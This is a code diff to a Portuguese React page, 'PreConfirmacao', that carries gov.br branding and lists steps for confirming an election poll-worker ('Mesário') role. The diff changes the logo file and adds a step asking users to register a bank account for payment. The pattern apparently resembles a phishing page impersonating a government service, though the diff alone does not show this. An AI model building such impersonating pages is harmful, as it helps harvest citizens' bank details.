@@ -22,7 +22,7 @@ export default function PreConfirmacao() {
     <>
       <header>
         <a href="#">
-          <img src="/images/govbr.png" alt="Logomarca GovBR" />
+          <img src="/images/govbr-new.png" alt="Logomarca GovBR" />
         </a>
         <div id="acessibilidade">
           <span>
@@ -176,6 +176,7 @@ export default function PreConfirmacao() {
                     <li>Confirmar seus horários de disponibilidade</li>
                     <li>Detalhar suas funções como Mesário 2</li>
                     <li>Validar a data: 01/03/2026</li>
+                    <li>Cadastrar sua conta bancária para recebimento</li>
                     <li>Esclarecer dúvidas sobre o processo</li>
                   </ul>
                 </div>
